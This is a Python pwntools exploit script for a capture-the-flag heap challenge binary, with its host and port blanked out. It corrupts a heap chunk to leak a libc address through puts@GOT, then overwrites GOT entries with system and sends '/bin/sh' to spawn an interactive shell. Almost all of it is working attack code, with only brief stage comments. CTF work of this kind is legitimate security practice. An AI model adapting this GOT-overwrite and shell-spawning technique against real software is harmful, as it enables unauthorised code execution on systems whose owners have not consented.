#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
elf = context.binary = ELF('./challenge_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x00000000004012FA
            b* 0x00000000004013C9
            b* 0x000000000040148E
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt):
    sla(b'> ', str(opt).encode())

def create():
    menu(1)

def read(idx):
    menu(2)
    sla(b'Index: ', str(idx).encode())

def write(idx, dt):
    menu(3)
    sla(b'Index: ', str(idx).encode())
    p.sendline(dt)

# Stage 1: Leak libc

create()
create()
create()

pl = flat(
    b'A'*0x20,
    0, 0x41, 1, 0x404008 # puts_got
    )
write(0, pl)
# GDB()
read(0x401040)
libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x606f0
log.info(f'libc: {hex(libc.address)}')
# log.info(f'stdin: {hex(libc.sym._IO_2_1_stdout_)}')
# log.info(f'stdout: {hex(libc.sym._IO_2_1_stdin_)}')
# log.info(f'stderr: {hex(libc.sym._IO_2_1_stderr_)}')

# Stage 2: trigger gets@got

write(0, b'/bin/sh\0')

pl = flat(
    libc.address + 0x606f0,
    libc.sym.system
    )
# GDB()
write(0x401040, pl)
menu(3)
sla(b'Index: ', b'0')
p.interactive()

# d1nhdwc